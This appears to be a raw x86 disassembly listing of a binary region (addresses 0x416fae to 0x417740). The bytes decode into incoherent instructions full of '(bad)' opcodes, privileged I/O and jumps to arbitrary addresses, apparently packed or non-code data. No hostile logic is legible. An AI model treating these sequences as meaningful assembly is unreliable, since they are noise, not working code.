  416fae:	cwde   
  416faf:	inc    edi
  416fb0:	dec    eax
  416fb1:	rcr    esi,0xf2
  416fb4:	jno    0x416f7b
  416fb6:	inc    ebp
  416fb7:	lods   al,BYTE PTR ds:[esi]
  416fb8:	xor    al,0xd3
  416fba:	enter  0x7a20,0x91
  416fbe:	add    eax,0x470272fd
  416fc3:	ret    0xd5be
  416fc6:	cwde   
  416fc7:	push   ecx
  416fc8:	popa   
  416fc9:	mov    edi,eax
  416fcb:	std    
  416fcc:	fcom   QWORD PTR [ebx]
  416fce:	stos   DWORD PTR es:[edi],eax
  416fcf:	cmp    eax,0xb9f1c569
  416fd4:	test   BYTE PTR [ecx-0x4e],0xb
  416fd8:	repnz add al,0x52
  416fdb:	repnz aas 
  416fdd:	test   ch,dh
  416fdf:	mov    dh,BYTE PTR [esi]
  416fe1:	adc    ebx,DWORD PTR [edi+0x1279bb]
  416fe7:	dec    edx
  416fe8:	mov    ds:0xdcaf06e7,al
  416fed:	add    BYTE PTR [ecx+0x7bf2b763],0xf1
  416ff4:	adc    BYTE PTR [ebp-0x728b76fa],ch
  416ffa:	mov    ebp,0xe356be39
  416fff:	aaa    
  417000:	les    ebp,FWORD PTR [esi]
  417002:	rol    DWORD PTR [edi+0x2e],1
  417005:	call   0x55e:0xfe84c4f4
  41700c:	outs   dx,BYTE PTR ds:[esi]
  41700d:	(bad)  
  41700e:	(bad)  
  41700f:	fistp  WORD PTR [esi+0x43]
  417012:	cmp    DWORD PTR [ebx+0x4c2c0935],esi
  417018:	loopne 0x416ff1
  41701a:	aad    0xd8
  41701c:	sbb    ah,al
  41701e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41701f:	dec    ebp
  417020:	cs ins BYTE PTR es:[edi],dx
  417022:	xor    eax,0xb0ed545e
  417027:	mov    edx,DWORD PTR [ebx-0x2981dcb6]
  41702d:	dec    edi
  41702e:	mov    eax,0x405a146d
  417033:	jg     0x416fcb
  417035:	sub    ebp,DWORD PTR [ebx]
  417037:	std    
  417038:	jp     0x4170b6
  41703a:	(bad)  
  41703b:	jle    0x417002
  41703d:	inc    eax
  41703e:	nop
  41703f:	outs   dx,DWORD PTR cs:[esi]
  417041:	dec    ebx
  417042:	xlat   BYTE PTR ds:[ebx]
  417043:	lods   eax,DWORD PTR ds:[esi]
  417044:	pop    eax
  417045:	xchg   edi,eax
  417046:	cli    
  417047:	jmp    0xedcd4cc
  41704c:	push   ebx
  41704d:	je     0x417079
  41704f:	push   edi
  417050:	rcr    DWORD PTR [eax+ebp*4+0x49],0xa7
  417055:	cmp    eax,0x1d9fb46f
  41705a:	dec    ebp
  41705b:	rcl    DWORD PTR [edi],0x4b
  41705e:	cmp    al,0x2a
  417060:	rcr    BYTE PTR [ebx],0xd5
  417063:	pop    ebp
  417064:	cs xchg ecx,eax
  417066:	nop
  417067:	test   DWORD PTR [edx],0x28712425
  41706d:	repnz push ss
  41706f:	in     eax,0xc6
  417071:	jbe    0x416ff5
  417073:	mov    BYTE PTR [ecx-0x71566bb],ch
  417079:	or     eax,0xbe31a385
  41707e:	ror    DWORD PTR [eax],1
  417080:	imul   ecx,DWORD PTR [ebx-0x4142bdc7],0x63
  417087:	sbb    eax,0x8b1aee48
  41708c:	mov    cs,WORD PTR [ecx+edi*4-0xf]
  417090:	jge    0x417055
  417092:	mov    ah,0xbf
  417094:	retf   0x3be5
  417097:	daa    
  417098:	sub    eax,0x7a4627f2
  41709d:	in     al,0x75
  41709f:	pop    ebp
  4170a0:	pop    ecx
  4170a1:	mov    ch,0xff
  4170a3:	cmp    esi,0xffffff9f
  4170a6:	add    ecx,DWORD PTR [eax+0x415cd0ac]
  4170ac:	jo     0x41706b
  4170ae:	xchg   esp,eax
  4170af:	cmp    al,0x24
  4170b1:	in     al,0xd3
  4170b3:	adc    eax,DWORD PTR [edx+0x7d6065b]
  4170b9:	not    DWORD PTR [ebp-0x61bfb9e4]
  4170bf:	push   ebx
  4170c0:	or     DWORD PTR [eax-0x13],ebx
  4170c3:	std    
  4170c4:	and    bl,dh
  4170c6:	sar    DWORD PTR [edi],1
  4170c8:	push   ecx
  4170c9:	mov    ebp,0x6d9b666d
  4170ce:	outs   dx,BYTE PTR ds:[esi]
  4170cf:	xor    BYTE PTR [edx+0x6dac25de],dl
  4170d5:	data16 (bad) 
  4170d7:	into   
  4170d8:	sub    eax,0x3bdec7ba
  4170dd:	xchg   ebx,eax
  4170de:	lods   eax,DWORD PTR ds:[esi]
  4170df:	xchg   ebp,eax
  4170e0:	mov    edx,0x73ec2718
  4170e5:	pop    ecx
  4170e6:	lahf   
  4170e7:	test   DWORD PTR [edi-0x14],ecx
  4170ea:	popf   
  4170eb:	push   ss
  4170ec:	(bad)  
  4170ed:	jmp    0x5a554224
  4170f2:	and    edi,DWORD PTR [edx+0x25]
  4170f5:	je     0x41710b
  4170f7:	sbb    eax,0x5287f472
  4170fc:	cmp    BYTE PTR [eax-0x72dd8467],ah
  417102:	xchg   esi,eax
  417103:	pop    esp
  417104:	fmulp  st(7),st
  417106:	int3   
  417107:	fbld   TBYTE PTR [ebx+ebp*4]
  41710a:	pand   mm0,QWORD PTR [edi]
  41710d:	cmp    ch,BYTE PTR [edi+0x66]
  417110:	out    0x73,eax
  417112:	pusha  
  417113:	xlat   BYTE PTR ds:[ebx]
  417114:	inc    edx
  417115:	icebp  
  417116:	xchg   DWORD PTR ds:0xdda9ae9e,ebx
  41711c:	push   ebx
  41711d:	adc    eax,0xfef02774
  417122:	jns    0x4170ce
  417124:	iret   
  417125:	cmc    
  417126:	mov    ecx,0xa796d010
  41712b:	lods   al,BYTE PTR ds:[esi]
  41712c:	in     al,dx
  41712d:	retf   0x10ef
  417130:	dec    ebp
  417131:	es xchg edi,eax
  417133:	dec    esi
  417134:	aas    
  417135:	das    
  417136:	fwait
  417137:	call   0xf66645b8
  41713c:	pop    edi
  41713d:	int3   
  41713e:	fstp   DWORD PTR [ecx+edi*8-0x28736935]
  417145:	mov    ebp,0xd590cdcc
  41714a:	dec    ebx
  41714b:	mul    BYTE PTR [edi-0x1c3dafe5]
  417151:	add    al,0x17
  417153:	pop    edi
  417154:	and    esp,esi
  417156:	dec    edi
  417157:	xor    BYTE PTR [ebx+0x50],bh
  41715a:	jl     0x4171be
  41715c:	lds    edx,FWORD PTR [ebx]
  41715e:	jle    0x4170f2
  417160:	add    BYTE PTR [edi+0x48cd6cf6],dh
  417166:	hlt    
  417167:	cld    
  417168:	pop    esp
  417169:	sbb    DWORD PTR [esi],edx
  41716b:	xlat   BYTE PTR ds:[ebx]
  41716c:	scas   eax,DWORD PTR es:[edi]
  41716d:	or     ah,BYTE PTR [edx+0x25]
  417170:	ss aad 0xa2
  417173:	or     al,0xc7
  417175:	lea    esp,[ebx]
  417177:	mov    es,WORD PTR [ebx]
  417179:	mov    edi,0x21277016
  41717e:	fiadd  DWORD PTR [ecx]
  417180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417182:	add    eax,esi
  417184:	cmp    al,al
  417186:	mov    eax,ds:0x251eac87
  41718b:	xchg   edi,eax
  41718c:	push   ecx
  41718d:	cwde   
  41718e:	mov    eax,ds:0xff4cdc64
  417193:	lds    eax,FWORD PTR [edx]
  417195:	inc    edx
  417196:	cdq    
  417197:	lock mov al,BYTE PTR [esi+0xe]
  41719b:	mov    dh,0xb7
  41719d:	mov    al,0xae
  41719f:	ja     0x41717f
  4171a1:	fisttp WORD PTR [edi+0x4d5de235]
  4171a7:	pop    ecx
  4171a8:	ror    BYTE PTR [edi+edx*4-0x34],1
  4171ac:	aam    0xa4
  4171ae:	outs   dx,BYTE PTR ds:[esi]
  4171af:	dec    ebx
  4171b0:	jno    0x417162
  4171b2:	mov    bh,0x82
  4171b4:	stc    
  4171b5:	add    ecx,ebx
  4171b7:	aas    
  4171b8:	mov    eax,ds:0x512dd245
  4171bd:	test   DWORD PTR [edx-0x57],edi
  4171c0:	pop    esp
  4171c1:	stos   BYTE PTR es:[edi],al
  4171c2:	fdivr  QWORD PTR [esi-0x302eafba]
  4171c8:	sti    
  4171c9:	pushf  
  4171ca:	test   al,0x1f
  4171cc:	frstor [ecx+0x5d]
  4171cf:	pop    ds
  4171d0:	(bad)  
  4171d1:	sbb    BYTE PTR [edx+edi*4],al
  4171d4:	pop    edi
  4171d5:	or     edi,DWORD PTR [ebx]
  4171d7:	pop    ds
  4171d8:	(bad)  
  4171d9:	xchg   esi,eax
  4171da:	cs fld QWORD PTR es:[ebp+0x13]
  4171df:	or     ah,BYTE PTR [edi+eax*2-0x34]
  4171e3:	mov    esp,0xcaed4502
  4171e8:	das    
  4171e9:	sub    cl,BYTE PTR [eax]
  4171eb:	and    DWORD PTR [esi],edx
  4171ed:	scas   eax,DWORD PTR es:[edi]
  4171ee:	xchg   esi,eax
  4171ef:	dec    eax
  4171f0:	inc    edx
  4171f1:	mov    ecx,0xdbebce56
  4171f6:	xchg   DWORD PTR [ebp+eax*8+0x31],edi
  4171fa:	sbb    al,0xf0
  4171fc:	in     eax,dx
  4171fd:	jp     0x417204
  4171ff:	jecxz  0x4171c4
  417201:	cld    
  417202:	cld    
  417203:	xor    DWORD PTR [ecx],0x277edffd
  417209:	dec    edi
  41720a:	or     esp,DWORD PTR [esi+ebx*4+0x17]
  41720e:	push   edi
  41720f:	bound  esp,QWORD PTR [edx]
  417211:	scas   eax,DWORD PTR es:[edi]
  417212:	mov    ds:0xf8c1c7ce,al
  417217:	cmc    
  417218:	xchg   ebp,eax
  417219:	out    0x3b,al
  41721b:	int    0xc5
  41721d:	add    edi,DWORD PTR [ebp+0x67099b47]
  417223:	ins    DWORD PTR es:[edi],dx
  417224:	add    al,bl
  417226:	jne    0x417264
  417228:	call   0x734:0xccf943ac
  41722f:	lahf   
  417230:	mov    dh,cl
  417232:	popa   
  417233:	cmp    DWORD PTR [edx],ebx
  417235:	xlat   BYTE PTR ds:[ebx]
  417236:	pop    ebx
  417237:	or     eax,0x1b42409a
  41723c:	dec    DWORD PTR [edx+0x43]
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	repz dec ebx
  417256:	in     al,0xc4
  417258:	jo     0x417280
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0xa170707e
  417261:	lds    edx,FWORD PTR [ebx+ebx*8+0x78]
  417265:	fcomi  st,st(7)
  417267:	jb     0x4172c8
  417269:	es int3 
  41726b:	or     ah,dl
  41726d:	dec    edi
  41726e:	jecxz  0x41726a
  417270:	cs out dx,al
  417272:	add    al,0x86
  417274:	mov    bh,0x8a
  417276:	or     DWORD PTR [edx-0x769b539b],edx
  41727c:	adc    ch,BYTE PTR [ebx]
  41727e:	dec    eax
  41727f:	mov    dl,0x64
  417281:	mov    ebx,0x6079849b
  417286:	dec    eax
  417287:	rcr    DWORD PTR [ebp-0x22],cl
  41728a:	pop    esi
  41728b:	fild   QWORD PTR [ebx-0x6b]
  41728e:	repz les edx,FWORD PTR [edi+0x465a3b95]
  417295:	fsub   QWORD PTR [ebx+0x6a79d3]
  41729b:	jle    0x417282
  41729d:	push   cs
  41729e:	push   ecx
  41729f:	sub    dl,dl
  4172a1:	push   esi
  4172a2:	jmp    0xc1f1bdd2
  4172a7:	ss dec esi
  4172a9:	and    BYTE PTR [esi-0x42],ch
  4172ac:	pop    esp
  4172ad:	test   al,0x59
  4172af:	stos   BYTE PTR es:[edi],al
  4172b0:	jle    0x4172d3
  4172b2:	gs gs (bad) 
  4172b5:	fs dec ecx
  4172b7:	sbb    bh,BYTE PTR ds:0x40eb61f8
  4172bd:	adc    ah,BYTE PTR [ecx-0x276da313]
  4172c3:	inc    ebp
  4172c4:	popf   
  4172c5:	not    DWORD PTR [ecx-0x653eb8eb]
  4172cb:	gs in  al,dx
  4172cd:	push   es
  4172ce:	rol    BYTE PTR [edx+0x694ab362],cl
  4172d4:	addr16 xchg edx,eax
  4172d6:	dec    esi
  4172d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d8:	mov    dh,0xdd
  4172da:	shl    BYTE PTR [esi-0x66405739],0xb5
  4172e1:	jbe    0x417275
  4172e3:	rcr    BYTE PTR [edx],0xd9
  4172e6:	sub    ebp,esp
  4172e8:	mov    esi,es
  4172ea:	cmc    
  4172eb:	fadd   DWORD PTR [ebx+0x18]
  4172ee:	adc    al,0x79
  4172f0:	jno    0x417296
  4172f2:	add    dh,BYTE PTR [eax-0x42]
  4172f5:	mov    edi,0x6758818b
  4172fa:	pop    sp
  4172fc:	add    ebx,DWORD PTR [ebp-0x3a]
  4172ff:	dec    ebx
  417300:	dec    ebp
  417301:	or     dl,bl
  417303:	sub    eax,ebp
  417305:	or     ebx,ecx
  417307:	xor    esi,DWORD PTR [edi+0x15]
  41730a:	mov    edi,0xcd69d01e
  41730f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417310:	int    0xf0
  417312:	inc    edi
  417313:	idiv   DWORD PTR [eax+0x1ff5116a]
  417319:	pop    esp
  41731a:	fucomip st,st(2)
  41731c:	xchg   ebp,eax
  41731d:	sbb    al,0x9a
  41731f:	fsub   st(7),st
  417321:	scas   eax,DWORD PTR es:[edi]
  417322:	mov    edi,0xa8232cd9
  417327:	(bad)  
  417328:	lods   al,BYTE PTR ds:[esi]
  417329:	fiadd  WORD PTR [edx]
  41732b:	xor    al,0xd0
  41732d:	in     al,0x38
  41732f:	and    al,0xee
  417331:	xchg   edx,eax
  417332:	mov    ecx,0x5cf566c4
  417337:	add    DWORD PTR [eax],0x1a
  41733a:	xor    eax,0x60918728
  41733f:	das    
  417340:	(bad)  
  417341:	pop    edi
  417342:	sbb    BYTE PTR [ebx+0x4ccf1c4a],dl
  417348:	mov    ebx,DWORD PTR [ebp+0x706e7406]
  41734e:	std    
  41734f:	pusha  
  417350:	jne    0x41732e
  417352:	cdq    
  417353:	lods   al,BYTE PTR ds:[esi]
  417354:	mov    bh,0x88
  417356:	arpl   WORD PTR [edx],cx
  417358:	mov    cs,WORD PTR [ebx-0x3f4077d2]
  41735e:	test   DWORD PTR [esi-0x4f8d9831],ecx
  417364:	and    BYTE PTR [ebx+0x2184903b],ch
  41736a:	pop    ebx
  41736b:	mov    bh,0xa9
  41736d:	js     0x417394
  41736f:	sbb    al,0x61
  417371:	cmp    DWORD PTR [ebx],0xde4bced7
  417377:	not    DWORD PTR [ecx]
  417379:	mov    ah,0xa4
  41737b:	dec    ebx
  41737c:	icebp  
  41737d:	js     0x41735e
  41737f:	je     0x417384
  417381:	shl    edi,cl
  417383:	(bad)  
  417384:	sub    eax,0xd6ba3213
  417389:	arpl   WORD PTR [eax+0x88fa337],ax
  41738f:	ja     0x41731f
  417391:	mov    cl,0xa9
  417393:	rcr    BYTE PTR [edi-0x3fe8589],cl
  417399:	jbe    0x41735d
  41739b:	enter  0x1d8,0xeb
  41739f:	dec    edi
  4173a0:	shl    BYTE PTR [ebp-0x42de0207],cl
  4173a6:	dec    esp
  4173a7:	mov    cl,0x64
  4173a9:	mov    bl,0xe
  4173ab:	sbb    edx,DWORD PTR [eax]
  4173ad:	into   
  4173ae:	pusha  
  4173af:	add    DWORD PTR [esi],ebp
  4173b1:	jmp    0x9e44db73
  4173b6:	out    dx,eax
  4173b7:	or     dh,ch
  4173b9:	stos   DWORD PTR es:[edi],eax
  4173ba:	add    BYTE PTR [ecx],0x16
  4173bd:	jnp    0x4173b4
  4173bf:	jne    0x4173fc
  4173c1:	dec    esp
  4173c2:	repz mov dl,BYTE PTR [ebx]
  4173c5:	dec    esi
  4173c6:	test   al,0x62
  4173c8:	jmp    0x10be:0x534f7bc1
  4173cf:	(bad)  [eax+0x31]
  4173d2:	sbb    BYTE PTR [ebx],0xaf
  4173d5:	mov    BYTE PTR [ebx+0x62],ch
  4173d8:	lahf   
  4173d9:	jno    0x41741e
  4173db:	push   ebp
  4173dc:	push   esp
  4173dd:	hlt    
  4173de:	lods   al,BYTE PTR ds:[esi]
  4173df:	mov    bl,0xdc
  4173e1:	jb     0x417376
  4173e3:	stc    
  4173e4:	mov    ebp,0x82dbc548
  4173e9:	mov    ds:0xe4cb6495,al
  4173ee:	and    DWORD PTR [eax+0x42],esi
  4173f1:	es inc sp
  4173f4:	inc    ebp
  4173f5:	dec    edi
  4173f6:	xor    ebp,DWORD PTR [ecx]
  4173f8:	or     al,0x5d
  4173fa:	jg     0x4173ef
  4173fc:	pop    es
  4173fd:	popa   
  4173fe:	in     eax,0x3d
  417400:	fnstcw WORD PTR ds:0xd5ad4d42
  417406:	ja     0x417437
  417408:	xchg   ebp,eax
  417409:	(bad)  
  41740a:	outs   dx,DWORD PTR ds:[esi]
  41740b:	dec    BYTE PTR [ecx-0x93187ff]
  417411:	adc    esi,esi
  417413:	call   0xfeb9a16
  417418:	mov    dh,0xba
  41741a:	mov    ah,0x85
  41741c:	cmp    ebx,DWORD PTR [ecx-0x33169394]
  417422:	mov    edx,0xe8308e51
  417427:	dec    ebx
  417428:	repz and eax,0xf4b37c3a
  41742e:	cli    
  41742f:	lahf   
  417430:	adc    ch,bh
  417432:	js     0x4173f5
  417434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417435:	cmp    bl,bh
  417437:	iret   
  417438:	inc    eax
  417439:	or     BYTE PTR [esi+0x7eeb5a7f],bl
  41743f:	(bad)  
  417440:	push   ss
  417441:	jne    0x417432
  417443:	ret    
  417444:	aad    0x48
  417446:	xchg   DWORD PTR [esi-0x62],esi
  417449:	ret    
  41744a:	mov    al,BYTE PTR [edx]
  41744c:	test   DWORD PTR [esi],esi
  41744e:	mov    bh,0xfd
  417450:	xchg   ebp,eax
  417451:	push   0xad799bf1
  417456:	les    ebp,FWORD PTR [ebx-0x19c6015b]
  41745c:	sbb    BYTE PTR [ecx+0x1f],0xa1
  417460:	mov    dl,0x19
  417462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417463:	out    0x5a,eax
  417465:	in     al,dx
  417466:	push   edi
  417467:	xchg   edi,eax
  417468:	jbe    0x4174ac
  41746a:	bnd jb 0x41747c
  41746d:	adc    bh,ch
  41746f:	mov    al,0x9e
  417471:	loopne 0x4173fb
  417473:	fwait
  417474:	fs xchg edi,eax
  417476:	(bad)  
  417477:	xchg   esi,eax
  417478:	jne    0x4174c8
  41747a:	jb     0x417414
  41747c:	push   eax
  41747d:	sahf   
  41747e:	outs   dx,BYTE PTR ds:[esi]
  41747f:	jge    0x417443
  417481:	push   esi
  417482:	stos   BYTE PTR es:[edi],al
  417483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417484:	mov    dl,0x9e
  417486:	cdq    
  417487:	cli    
  417488:	into   
  417489:	enter  0xc3ed,0x2
  41748d:	inc    eax
  41748e:	xchg   ah,cl
  417490:	retf   0xcf4d
  417493:	es add eax,eax
  417496:	retf   
  417497:	add    eax,0x2341ca27
  41749c:	imul   esp,DWORD PTR [ebp-0x69],0xbcbe5260
  4174a3:	inc    edx
  4174a4:	cmp    ch,bh
  4174a6:	or     eax,0x8e915e9
  4174ab:	xchg   DWORD PTR [edi],edi
  4174ad:	ret    
  4174ae:	inc    ecx
  4174af:	and    dh,BYTE PTR [esi-0x4ba7bf25]
  4174b5:	jno    0x41752f
  4174b7:	xchg   edi,eax
  4174b8:	xchg   ecx,eax
  4174b9:	call   0xb4dd:0xfec4f108
  4174c0:	je     0x417444
  4174c2:	and    eax,0x4f43ea73
  4174c7:	retf   
  4174c8:	inc    edi
  4174c9:	mov    al,ds:0xa0823b6c
  4174ce:	cmp    DWORD PTR [eax-0x10b5f6e2],edx
  4174d4:	xchg   edx,eax
  4174d5:	inc    edi
  4174d6:	popa   
  4174d7:	inc    edi
  4174d8:	mov    gs,WORD PTR [esi]
  4174da:	mov    dl,0xac
  4174dc:	jns    0x4174ea
  4174de:	xchg   edx,eax
  4174df:	inc    esi
  4174e0:	int    0x85
  4174e2:	adc    BYTE PTR [eax-0x6f],cl
  4174e5:	sub    edx,ebx
  4174e7:	inc    edi
  4174e8:	or     ch,BYTE PTR [esi]
  4174ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174eb:	jecxz  0x417523
  4174ed:	nop
  4174ee:	rcr    BYTE PTR [ebx+0x43],cl
  4174f1:	pusha  
  4174f2:	fcomp  DWORD PTR [edx]
  4174f4:	inc    ebp
  4174f5:	(bad)  
  4174f6:	data16 fadd QWORD PTR [ebx-0x34]
  4174fa:	or     al,0xca
  4174fc:	popa   
  4174fd:	dec    edi
  4174fe:	rcr    edx,1
  417500:	(bad)  
  417501:	into   
  417502:	and    eax,0x7adb69c6
  417507:	icebp  
  417508:	nop
  417509:	data16 fnclex 
  41750c:	sub    bl,bh
  41750e:	inc    edx
  41750f:	mov    al,0xd9
  417511:	in     al,0xa8
  417513:	mov    WORD PTR [esi-0x73],cs
  417516:	aas    
  417517:	xchg   ecx,eax
  417518:	fwait
  417519:	dec    ecx
  41751a:	outs   dx,BYTE PTR ds:[esi]
  41751b:	and    DWORD PTR [ebp-0x6f],esp
  41751e:	cmp    al,0x9e
  417520:	push   ebp
  417521:	or     eax,0xae15b63b
  417526:	test   DWORD PTR [ebx],esi
  417528:	rol    BYTE PTR [ecx],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edx],edi
  417543:	jge    0x4174d5
  417545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x4175b3
  41754f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417550:	inc    ebx
  417551:	repz dec eax
  417553:	mov    ebx,0x2ceca5dd
  417558:	dec    ebx
  417559:	setno  bh
  41755c:	pop    ebp
  41755d:	imul   ebp,DWORD PTR [ebx-0xf1565af],0xaf9990e4
  417567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417568:	ss pusha 
  41756a:	pop    eax
  41756b:	js     0x4175a0
  41756d:	sahf   
  41756e:	test   al,0xcc
  417570:	stos   BYTE PTR es:[edi],al
  417571:	jmp    0x417548
  417573:	icebp  
  417574:	adc    esp,esi
  417576:	push   es
  417577:	(bad)  
  417578:	(bad)  
  41757a:	mov    edi,fs
  41757c:	xor    eax,0x6011e33c
  417581:	pop    edx
  417582:	repz bound ebp,QWORD PTR [di]
  417586:	mov    ebx,fs
  417588:	cli    
  417589:	dec    esi
  41758a:	mov    ah,0xa5
  41758c:	in     al,0xa1
  41758e:	jle    0x417565
  417590:	mov    ds:0xf18e4b99,eax
  417595:	jnp    0x417600
  417597:	scas   eax,DWORD PTR es:[edi]
  417598:	jbe    0x4175b5
  41759a:	aas    
  41759b:	mov    ds:0xdcaf7f2,eax
  4175a0:	jns    0x4175e7
  4175a2:	shl    DWORD PTR [esi],0x58
  4175a5:	pop    ds
  4175a6:	and    al,0xa5
  4175a8:	adc    ecx,ebp
  4175aa:	xchg   ebx,eax
  4175ab:	push   ds
  4175ac:	pop    es
  4175ad:	inc    esp
  4175ae:	ds test al,0xbd
  4175b1:	mov    bh,0xdc
  4175b3:	sahf   
  4175b4:	add    ecx,eax
  4175b6:	shl    DWORD PTR [ebx+0x46],0x69
  4175ba:	repz push cs
  4175bc:	pusha  
  4175bd:	cdq    
  4175be:	hlt    
  4175bf:	arpl   WORD PTR [eax-0x1a787303],bp
  4175c5:	sti    
  4175c6:	neg    al
  4175c8:	xor    BYTE PTR [edx+esi*8+0x1f],0x44
  4175cd:	mov    ch,0x9
  4175cf:	sbb    eax,DWORD PTR [edx-0x14f608f5]
  4175d5:	inc    esi
  4175d6:	sahf   
  4175d7:	sub    eax,0xf79a9871
  4175dc:	and    bh,ch
  4175de:	outs   dx,BYTE PTR ds:[esi]
  4175df:	adc    BYTE PTR [ecx-0x30],cl
  4175e2:	xor    al,ch
  4175e4:	scas   eax,DWORD PTR es:[edi]
  4175e5:	mov    al,0xf
  4175e7:	cmp    BYTE PTR [ecx],0x68
  4175ea:	dec    ecx
  4175eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ec:	inc    edx
  4175ed:	sub    BYTE PTR [eax+0x72ed01c0],cl
  4175f3:	int    0x78
  4175f5:	inc    esi
  4175f6:	fwait
  4175f7:	jmp    0x6c215780
  4175fc:	fs dec edx
  4175fe:	popf   
  4175ff:	dec    esi
  417600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417601:	mov    al,ds:0x900d7fc0
  417606:	call   0x1e3c76b2
  41760b:	popf   
  41760c:	popa   
  41760d:	out    dx,al
  41760e:	test   al,0xeb
  417610:	lahf   
  417611:	pop    ecx
  417612:	mov    bh,0x86
  417614:	push   esi
  417615:	mov    al,ds:0x417b8d0
  41761a:	je     0x417601
  41761c:	dec    esp
  41761d:	pop    ds
  41761e:	stos   BYTE PTR es:[edi],al
  41761f:	aaa    
  417620:	sbb    eax,DWORD PTR [edi-0x2d]
  417623:	aaa    
  417624:	ret    
  417625:	and    BYTE PTR [ebp-0x4ddae124],ch
  41762b:	sbb    esp,DWORD PTR [edx-0x1c95e281]
  417631:	gs mov ah,0x7a
  417634:	add    ebx,eax
  417636:	mov    ebx,0x6a8b34df
  41763b:	and    eax,0x7761d345
  417640:	xlat   BYTE PTR ds:[ebx]
  417641:	jle    0x41760f
  417643:	jns    0x417673
  417645:	pop    esi
  417646:	inc    edi
  417647:	cmp    al,0xba
  417649:	jmp    0x583b:0x36fa64b
  417650:	test   ebp,ebx
  417652:	fwait
  417653:	mov    edx,0x4570de9a
  417658:	mov    esi,DWORD PTR [edx+0x73]
  41765b:	mov    eax,ds:0x2c417cc1
  417660:	dec    edx
  417661:	aad    0xbc
  417663:	or     ah,dl
  417665:	rol    cl,1
  417667:	or     DWORD PTR [esi-0x68b216b6],esi
  41766d:	dec    esi
  41766e:	push   ss
  41766f:	cdq    
  417670:	(bad)  
  417671:	fnsave [esi]
  417673:	test   al,0xba
  417675:	stos   BYTE PTR es:[edi],al
  417676:	jmp    0xd4c3:0x7a8aef5
  41767d:	add    edi,DWORD PTR [ebx+0x12]
  417680:	aaa    
  417681:	mov    bh,ah
  417683:	pop    esi
  417684:	int    0x69
  417686:	mov    esi,0x786c5ded
  41768b:	xchg   ebp,eax
  41768c:	push   ebp
  41768d:	xor    eax,0x326746c1
  417692:	mov    eax,ds:0x30562a76
  417697:	outs   dx,BYTE PTR ds:[esi]
  417698:	fcomp  DWORD PTR [ebx]
  41769a:	repz adc ecx,ebp
  41769d:	neg    DWORD PTR [edi+0x1edc46b5]
  4176a3:	sbb    al,0xfb
  4176a5:	stc    
  4176a6:	mov    dh,0x35
  4176a8:	cld    
  4176a9:	push   0xffffffa4
  4176ab:	fwait
  4176ac:	xchg   BYTE PTR [esi-0x3f],ch
  4176af:	sbb    DWORD PTR [ecx+0x3d],edx
  4176b2:	test   eax,0x24fa9a6c
  4176b7:	pusha  
  4176b8:	stos   DWORD PTR es:[edi],eax
  4176b9:	rcl    DWORD PTR [esp+ebp*4],cl
  4176bc:	xchg   edx,eax
  4176bd:	mov    ds:0x95fff6e4,eax
  4176c2:	jge    0x41766c
  4176c4:	mov    dl,bh
  4176c6:	xor    BYTE PTR [edx+0x3e61d584],al
  4176cc:	jne    0x417738
  4176ce:	xchg   ebx,eax
  4176cf:	ins    BYTE PTR es:[edi],dx
  4176d0:	mov    edi,0xa8ce48e
  4176d5:	rcl    BYTE PTR [ebx+0x5f8b9fcd],cl
  4176db:	leave  
  4176dc:	pop    edi
  4176dd:	ins    BYTE PTR es:[edi],dx
  4176de:	daa    
  4176df:	adc    bl,BYTE PTR [esp+edx*8-0x64]
  4176e3:	(bad)  
  4176e4:	fistp  DWORD PTR [esi]
  4176e6:	jge    0x4176dc
  4176e8:	out    0x6c,al
  4176ea:	pop    ebx
  4176eb:	sbb    al,0x7d
  4176ed:	push   0xffffff9a
  4176ef:	inc    edx
  4176f0:	es adc al,0xd8
  4176f3:	jg     0x4176a0
  4176f5:	push   ebx
  4176f6:	mov    ds:0x626873c1,eax
  4176fb:	stc    
  4176fc:	getsec 
  4176fe:	mov    BYTE PTR [esi+edx*1+0x4356c528],ch
  417705:	ret    
  417706:	mov    ebp,0x46c50b03
  41770b:	ja     0x417783
  41770d:	lods   eax,DWORD PTR ds:[esi]
  41770e:	adc    dh,BYTE PTR [edi-0x15]
  417711:	inc    edx
  417712:	dec    ebx
  417713:	in     al,0x3f
  417715:	jae    0x41770b
  417717:	stos   BYTE PTR es:[edi],al
  417718:	push   es
  417719:	cwde   
  41771a:	js     0x417727
  41771c:	ficomp DWORD PTR [edi]
  41771e:	(bad)  [eax+0x5f284739]
  417724:	(bad)  
  417726:	add    DWORD PTR [ebx-0x52802050],ebp
  41772c:	mov    al,0x4f
  41772e:	ds repnz int3 
  417731:	cmp    al,0xc4
  417733:	inc    esp
  417734:	jno    0x417762
  417736:	sub    DWORD PTR [edi-0x1d],ebx
  417739:	mov    ebx,0xa65ce641
  41773e:	xchg   edx,eax
  41773f:	popf   
  417740:	sbb    bh,BYTE PTR [esp+eax*4-0x7d]
